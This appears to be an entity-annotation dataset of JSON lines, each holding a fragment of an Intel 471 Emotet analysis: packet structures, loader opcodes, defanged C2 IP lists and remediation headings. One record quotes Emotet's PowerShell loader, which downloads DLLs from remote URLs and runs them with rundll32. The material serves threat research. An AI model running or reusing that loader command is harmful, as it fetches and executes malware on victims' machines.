{"mention": "```", "context_left": "}", "context_right": "The randomly generated data has some interesting formatting performed on it that first replaces all nulls with `0xC3`.", "_context_left": "", "_context_right": "", "sentence_left": "}", "sentence_right": "The randomly generated data has some interesting formatting performed on it that first replaces all nulls with `0xC3`.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "The following table shows the cmd\\\\_ids that have been observed:", "context_left": "```", "context_right": "| **Command ID (decimal)** | **Command ID (hex)** | **Description** |", "_context_left": "", "_context_right": "", "sentence_left": "```", "sentence_right": "| **Command ID (decimal)** | **Command ID (hex)** | **Description** |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "powershell $dfkj=\"$strs=\\\"\".Split(\\\",\\\");foreach($st in $strs){$r1=Get-Random;$r2=Get-Random;$tpth=\\\"c:\\programdata\\\\\\\"+$r1+\\\"[.]dll\\\";Invoke-WebRequest -Uri $st -OutFile $tpth;if(Test-Path $tpth){$fp=\\\"c:\\windows\\syswow64\\rundll32[.]exe\\\";$a=$tpth+\\\",f\\\"+$r2;Start-Process $fp -ArgumentList $a;break;}};\";IEX $dfkj", "context_left": "* ```", "context_right": "```", "_context_left": "", "_context_right": "", "sentence_left": "* ```", "sentence_right": "```", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "}", "context_left": "uint8\\\\_t data[data\\\\_size]; // Plaintext packet", "context_right": "```", "_context_left": "", "_context_right": "", "sentence_left": "uint8\\\\_t data[data\\\\_size]; // Plaintext packet", "sentence_right": "```", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "\"C:\\windows\\syswow64\\rundll32[.]exe\" c:\\programdata\\219183368[.]dll,f920683129", "context_left": "* ```", "context_right": "```", "_context_left": "", "_context_right": "", "sentence_left": "* ```", "sentence_right": "```", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* ```", "context_left": "```", "context_right": "powershell $dfkj=\"$strs=\\\"\".Split(\\\",\\\");foreach($st in $strs){$r1=Get-Random;$r2=Get-Random;$tpth=\\\"c:\\programdata\\\\\\\"+$r1+\\\"[.]dll\\\";Invoke-WebRequest -Uri $st -OutFile $tpth;if(Test-Path $tpth){$fp=\\\"c:\\windows\\syswow64\\rundll32[.]exe\\\";$a=$tpth+\\\",f\\\"+$r2;Start-Process $fp -ArgumentList $a;break;}};\";IEX $dfkj", "_context_left": "", "_context_right": "", "sentence_left": "```", "sentence_right": "powershell $dfkj=\"$strs=\\\"\".Split(\\\",\\\");foreach($st in $strs){$r1=Get-Random;$r2=Get-Random;$tpth=\\\"c:\\programdata\\\\\\\"+$r1+\\\"[.]dll\\\";Invoke-WebRequest -Uri $st -OutFile $tpth;if(Test-Path $tpth){$fp=\\\"c:\\windows\\syswow64\\rundll32[.]exe\\\";$a=$tpth+\\\",f\\\"+$r2;Start-Process $fp -ArgumentList $a;break;}};\";IEX $dfkj", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "{", "context_left": "struct layer\\\\_2\\\\_packet", "context_right": "uint32\\\\_t cmd\\\\_id;", "_context_left": "", "_context_right": "", "sentence_left": "struct layer\\\\_2\\\\_packet", "sentence_right": "uint32\\\\_t cmd\\\\_id;", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "```", "context_left": "}", "context_right": "The following table shows the cmd\\\\_ids that have been observed:", "_context_left": "", "_context_right": "", "sentence_left": "}", "sentence_right": "The following table shows the cmd\\\\_ids that have been observed:", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint8\\\\_t data[data\\\\_size]; // Plaintext packet", "context_left": "uint32\\\\_t data\\\\_size; // Plaintext packet size", "context_right": "}", "_context_left": "", "_context_right": "", "sentence_left": "uint32\\\\_t data\\\\_size; // Plaintext packet size", "sentence_right": "}", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://207.148.81.119:8080", "context_left": "* hxxps://142.4.219.173:8080", "context_right": "* hxxps://177.72.80.14:7080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://142.4.219.173:8080", "sentence_right": "* hxxps://177.72.80.14:7080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://58.227.42.236:80", "context_left": "* hxxps://91.200.186.228:443", "context_right": "* hxxps://107.182.225.142:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://91.200.186.228:443", "sentence_right": "* hxxps://107.182.225.142:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://78.46.73.125:443", "context_left": "* hxxps://195.77.239.39:8080", "context_right": "* hxxps://37.44.244.177:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://195.77.239.39:8080", "sentence_right": "* hxxps://37.44.244.177:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://176.104.106.96:8080", "context_left": "* hxxps://104.251.214.46:8080", "context_right": "* hxxps://158.69.222.101:443", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://104.251.214.46:8080", "sentence_right": "* hxxps://158.69.222.101:443", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint32\\\\_t cmd\\\\_id;", "context_left": "{", "context_right": "uint32\\\\_t hash\\\\_size; // 0x20", "_context_left": "", "_context_right": "", "sentence_left": "{", "sentence_right": "uint32\\\\_t hash\\\\_size; // 0x20", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://91.200.186.228:443", "context_left": "* hxxps://178.79.147.66:8080", "context_right": "* hxxps://58.227.42.236:80", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://178.79.147.66:8080", "sentence_right": "* hxxps://58.227.42.236:80", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "| **Opcode** | **Command name** | **Description** |", "context_left": "This table handles module/binary execution and has the following opcodes:", "context_right": "| 1 | Update binary | Drops and starts binary after extracting modlist/drop directory and appending to command line as base64.", "_context_left": "", "_context_right": "", "sentence_left": "This table handles module/binary execution and has the following opcodes:", "sentence_right": "| 1 | Update binary | Drops and starts binary after extracting modlist/drop directory and appending to command line as base64.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "struct layer\\\\_2\\\\_packet", "context_left": "```", "context_right": "{", "_context_left": "", "_context_right": "", "sentence_left": "```", "sentence_right": "{", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "**What we already knew**", "context_left": "By searching for these differences, security teams can fine-tune their defenses to make sure this new version can be detected.", "context_right": "Emotet is a loader-focused, modular malware family that can steal credentials and emails, while also allowing users to send spam from infected users.", "_context_left": "", "_context_right": "", "sentence_left": "By searching for these differences, security teams can fine-tune their defenses to make sure this new version can be detected.", "sentence_right": "Emotet is a loader-focused, modular malware family that can steal credentials and emails, while also allowing users to send spam from infected users.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://178.79.147.66:8080", "context_left": "* hxxps://138.185.72.26:8080", "context_right": "* hxxps://91.200.186.228:443", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://138.185.72.26:8080", "sentence_right": "* hxxps://91.200.186.228:443", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://54.38.242.185:443", "context_left": "* hxxps://45.79.33.48:8080", "context_right": "* hxxps://191.252.103.16:80", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://45.79.33.48:8080", "sentence_right": "* hxxps://191.252.103.16:80", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "The following IPs are currently observed in use for Epoch 5:", "context_left": "* hxxps://103.75.201.2:443", "context_right": "* hxxps://85.214.67.203:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://103.75.201.2:443", "sentence_right": "* hxxps://85.214.67.203:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "![Image 2 the lure]()", "context_left": "Upon opening Emotet maldocs, victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros.", "context_right": "The image depicts an Emotet document lure.", "_context_left": "", "_context_right": "", "sentence_left": "Upon opening Emotet maldocs, victims are greeted with fake Microsoft 365 prompt that states “THIS DOCUMENT IS PROTECTED,” and instructs victims on how to enable macros.", "sentence_right": "The image depicts an Emotet document lure.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* Epoch5", "context_left": "* Epoch4", "context_right": "Additionally, prior to Emotet’s takedown, it had the following distinct botnets:", "_context_left": "", "_context_right": "", "sentence_left": "* Epoch4", "sentence_right": "Additionally, prior to Emotet’s takedown, it had the following distinct botnets:", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "|", "context_left": "| 7 | Execute dll with `rundll32[.]exe` | Drops and executes DLL with `“rundll32[.]exe , Control\\_RunDLL.”`", "context_right": "The update to the loader’s command table gives Emotet much more customizable execution options, allowing Emotet to better function as a loader-focused distribution family.", "_context_left": "", "_context_right": "", "sentence_left": "| 7 | Execute dll with `rundll32[.]exe` | Drops and executes DLL with `“rundll32[.]exe , Control\\_RunDLL.”`", "sentence_right": "The update to the loader’s command table gives Emotet much more customizable execution options, allowing Emotet to better function as a loader-focused distribution family.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://195.154.133.20:443", "context_left": "* hxxps://212.237.5.209:443", "context_right": "* hxxps://110.232.117.186:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://212.237.5.209:443", "sentence_right": "* hxxps://110.232.117.186:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "The following structure can be observed for L3:", "context_left": "L3 for Emotet’s communication protocol contains the encrypted L2, the ECC key used to encrypt L2 and some randomly generated data that serves as padding.", "context_right": "```", "_context_left": "", "_context_right": "", "sentence_left": "L3 for Emotet’s communication protocol contains the encrypted L2, the ECC key used to encrypt L2 and some randomly generated data that serves as padding.", "sentence_right": "```", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://103.8.26.103:8080", "context_left": "The following IPs are currently observed in use for Epoch 4:", "context_right": "* hxxps://212.237.17.99:8080", "_context_left": "", "_context_right": "", "sentence_left": "The following IPs are currently observed in use for Epoch 4:", "sentence_right": "* hxxps://212.237.17.99:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://191.252.196.221:8080", "context_left": "* hxxps://110.232.117.186:8080", "context_right": "* hxxps://185.184.25.237:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://110.232.117.186:8080", "sentence_right": "* hxxps://185.184.25.237:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "struct L3\\\\_packet", "context_left": "```", "context_right": "{", "_context_left": "", "_context_right": "", "sentence_left": "```", "sentence_right": "{", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "{", "context_left": "struct layer\\\\_1\\\\_packet", "context_right": "uint32\\\\_t victim\\\\_id\\\\_size;", "_context_left": "", "_context_right": "", "sentence_left": "struct layer\\\\_1\\\\_packet", "sentence_right": "uint32\\\\_t victim\\\\_id\\\\_size;", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "The groups who run these botnets are sophisticated and resilient, and will most likely have some sort of inherent recovery in place.", "context_left": "We wrote in January that “Only time will tell if the takedown will have a long-term impact on Emotet operations.", "context_right": "While it took months to do, it looks like those behind Emotet have recovered.", "_context_left": "", "_context_right": "", "sentence_left": "We wrote in January that “Only time will tell if the takedown will have a long-term impact on Emotet operations.", "sentence_right": "While it took months to do, it looks like those behind Emotet have recovered.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://142.4.219.173:8080", "context_left": "* hxxps://185.148.169.10:8080", "context_right": "* hxxps://207.148.81.119:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://185.148.169.10:8080", "sentence_right": "* hxxps://207.148.81.119:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://212.237.56.116:7080", "context_left": "* hxxps://188.165.214.166:7080", "context_right": "* hxxps://45.142.114.231:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://188.165.214.166:7080", "sentence_right": "* hxxps://45.142.114.231:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "```", "context_left": "The following structure can be observed for L3:", "context_right": "struct L3\\\\_packet", "_context_left": "", "_context_right": "", "sentence_left": "The following structure can be observed for L3:", "sentence_right": "struct L3\\\\_packet", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* Epoch2", "context_left": "* Epoch1", "context_right": "* Epoch3", "_context_left": "", "_context_right": "", "sentence_left": "* Epoch1", "sentence_right": "* Epoch3", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "The image depicts the structure for Emotet's initial check-in.", "context_left": "![Image 3 proto format]()", "context_right": "A new addition to the Emotet protocol requirements and Emotet module list, the process checking module is sent to the bot after the C2 receives the bot’s initial check-in.", "_context_left": "", "_context_right": "", "sentence_left": "![Image 3 proto format]()", "sentence_right": "A new addition to the Emotet protocol requirements and Emotet module list, the process checking module is sent to the bot after the C2 receives the bot’s initial check-in.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://37.59.209.141:8080", "context_left": "* hxxps://51.210.242.234:8080", "context_right": "* hxxps://168.197.250.14:80", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://51.210.242.234:8080", "sentence_right": "* hxxps://168.197.250.14:80", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "| 1000 | 0x3E8 | Proclist check-in packet |", "context_left": "| 1 | 0x01 | Initial victim check-in packet |", "context_right": "**Protocol Changes: L3**", "_context_left": "", "_context_right": "", "sentence_left": "| 1 | 0x01 | Initial victim check-in packet |", "sentence_right": "**Protocol Changes: L3**", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "The following IPs are currently observed in use for Epoch 4:", "context_left": "* Epoch3", "context_right": "* hxxps://103.8.26.103:8080", "_context_left": "", "_context_right": "", "sentence_left": "* Epoch3", "sentence_right": "* hxxps://103.8.26.103:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "**What we suggest for remediation**", "context_left": "* hxxps://78.47.204.80:443", "context_right": "As Emotet is a multistage infection, there are many opportunities for defenders to catch it during operation.", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://78.47.204.80:443", "sentence_right": "As Emotet is a multistage infection, there are many opportunities for defenders to catch it during operation.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint8\\\\_t victim\\\\_id[victim\\\\_id\\\\_size]; // hostname + hex volume serial number", "context_left": "uint32\\\\_t victim\\\\_id\\\\_size;", "context_right": "uint32\\\\_t path\\\\_name\\\\_hash;", "_context_left": "", "_context_right": "", "sentence_left": "uint32\\\\_t victim\\\\_id\\\\_size;", "sentence_right": "uint32\\\\_t path\\\\_name\\\\_hash;", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "|", "context_left": "| 5 | Inject DLL with export | Injects a DLL into memory and maps and executes the export DllRegisterServer.", "context_right": "| 6 | Execute dll with `regsvr32[.]exe` | Drops and executes DLL with `“regsvr32[.]exe -s .”`", "_context_left": "", "_context_right": "", "sentence_left": "| 5 | Inject DLL with export | Injects a DLL into memory and maps and executes the export DllRegisterServer.", "sentence_right": "| 6 | Execute dll with `regsvr32[.]exe` | Drops and executes DLL with `“regsvr32[.]exe -s .”`", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://85.214.67.203:8080", "context_left": "The following IPs are currently observed in use for Epoch 5:", "context_right": "* hxxps://51.178.61.60:443", "_context_left": "", "_context_right": "", "sentence_left": "The following IPs are currently observed in use for Epoch 5:", "sentence_right": "* hxxps://51.178.61.60:443", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "It then selects a random integer between zero and 14 and writes `0x00`to the offset of that integer.", "context_left": "The randomly generated data has some interesting formatting performed on it that first replaces all nulls with `0xC3`.", "context_right": "**Loader command table changes**", "_context_left": "", "_context_right": "", "sentence_left": "The randomly generated data has some interesting formatting performed on it that first replaces all nulls with `0xC3`.", "sentence_right": "**Loader command table changes**", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://37.44.244.177:8080", "context_left": "* hxxps://78.46.73.125:443", "context_right": "* hxxps://195.154.146.35:443", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://78.46.73.125:443", "sentence_right": "* hxxps://195.154.146.35:443", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "By searching for these differences, security teams can fine-tune their defenses to make sure this new version can be detected.", "context_left": "Further investigation into Emotet’s keys and IP buffers also revealed two separate botnets are being used to distribute the malware.", "context_right": "**What we already knew**", "_context_left": "", "_context_right": "", "sentence_left": "Further investigation into Emotet’s keys and IP buffers also revealed two separate botnets are being used to distribute the malware.", "sentence_right": "**What we already knew**", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "{", "context_left": "struct L3\\\\_packet", "context_right": "uint8\\\\_t enc\\\\_secret\\\\_key[0x40]; // ECDH key", "_context_left": "", "_context_right": "", "sentence_left": "struct L3\\\\_packet", "sentence_right": "uint8\\\\_t enc\\\\_secret\\\\_key[0x40]; // ECDH key", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "```", "context_left": "The following structure can be observed for L2:", "context_right": "struct layer\\\\_2\\\\_packet", "_context_left": "", "_context_right": "", "sentence_left": "The following structure can be observed for L2:", "sentence_right": "struct layer\\\\_2\\\\_packet", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint32\\\\_t module\\\\_job\\\\_id;", "context_left": "uint32\\\\_t module\\\\_id; //0x2 or 2 in decimal", "context_right": "uint32\\\\_t victim\\\\_id\\\\_size;", "_context_left": "", "_context_right": "", "sentence_left": "uint32\\\\_t module\\\\_id; //0x2 or 2 in decimal", "sentence_right": "uint32\\\\_t victim\\\\_id\\\\_size;", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "|", "context_left": "| 1 | Update binary | Drops and starts binary after extracting modlist/drop directory and appending to command line as base64.", "context_right": "| 2 | Load Module | Injects a module into memory.", "_context_left": "", "_context_right": "", "sentence_left": "| 1 | Update binary | Drops and starts binary after extracting modlist/drop directory and appending to command line as base64.", "sentence_right": "| 2 | Load Module | Injects a module into memory.", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "```", "context_left": "}", "context_right": "This structure can also be observed in the image below:", "_context_left": "", "_context_right": "", "sentence_left": "}", "sentence_right": "This structure can also be observed in the image below:", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "| 1 | 0x01 | Initial victim check-in packet |", "context_left": "| **Command ID (decimal)** | **Command ID (hex)** | **Description** |", "context_right": "| 1000 | 0x3E8 | Proclist check-in packet |", "_context_left": "", "_context_right": "", "sentence_left": "| **Command ID (decimal)** | **Command ID (hex)** | **Description** |", "sentence_right": "| 1000 | 0x3E8 | Proclist check-in packet |", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "|", "context_left": "| 6 | Execute dll with `regsvr32[.]exe` | Drops and executes DLL with `“regsvr32[.]exe -s .”`", "context_right": "| 7 | Execute dll with `rundll32[.]exe` | Drops and executes DLL with `“rundll32[.]exe , Control\\_RunDLL.”`", "_context_left": "", "_context_right": "", "sentence_left": "| 6 | Execute dll with `regsvr32[.]exe` | Drops and executes DLL with `“regsvr32[.]exe -s .”`", "sentence_right": "| 7 | Execute dll with `rundll32[.]exe` | Drops and executes DLL with `“rundll32[.]exe , Control\\_RunDLL.”`", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "* hxxps://191.252.103.16:80", "context_left": "* hxxps://54.38.242.185:443", "context_right": "* hxxps://196.44.98.190:8080", "_context_left": "", "_context_right": "", "sentence_left": "* hxxps://54.38.242.185:443", "sentence_right": "* hxxps://196.44.98.190:8080", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "```", "context_left": "This module exclusively grabs the infected victim’s process list, which is sent back to the C2 using the following L1:", "context_right": "struct layer\\\\_1\\\\_packet", "_context_left": "", "_context_right": "", "sentence_left": "This module exclusively grabs the infected victim’s process list, which is sent back to the C2 using the following L1:", "sentence_right": "struct layer\\\\_1\\\\_packet", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint32\\\\_t data\\\\_size; // Plaintext packet size", "context_left": "uint8\\\\_t data\\\\_hash[0x20]; // SHA-256 hash of Plaintext packet", "context_right": "uint8\\\\_t data[data\\\\_size]; // Plaintext packet", "_context_left": "", "_context_right": "", "sentence_left": "uint8\\\\_t data\\\\_hash[0x20]; // SHA-256 hash of Plaintext packet", "sentence_right": "uint8\\\\_t data[data\\\\_size]; // Plaintext packet", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "uint8\\\\_t data\\\\_hash[0x20]; // SHA-256 hash of Plaintext packet", "context_left": "uint32\\\\_t hash\\\\_size; // 0x20", "context_right": "uint32\\\\_t data\\\\_size; // Plaintext packet size", "_context_left": "", "_context_right": "", "sentence_left": "uint32\\\\_t hash\\\\_size; // 0x20", "sentence_right": "uint32\\\\_t data\\\\_size; // Plaintext packet size", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
{"mention": "}", "context_left": "uint8\\\\_t random\\\\_data[]; // Random data generated using BCryptGenRandom function", "context_right": "```", "_context_left": "", "_context_right": "", "sentence_left": "uint8\\\\_t random\\\\_data[]; // Random data generated using BCryptGenRandom function", "sentence_right": "```", "label": "No Annotation", "label_id": 1906, "label_title": "No Annotation", "label_link": "No Annotation", "entity_class": "CI", "entity_type": "TECHNIQUE", "document": "intel471_2021-12-09_emotet-returns-december-2021"}
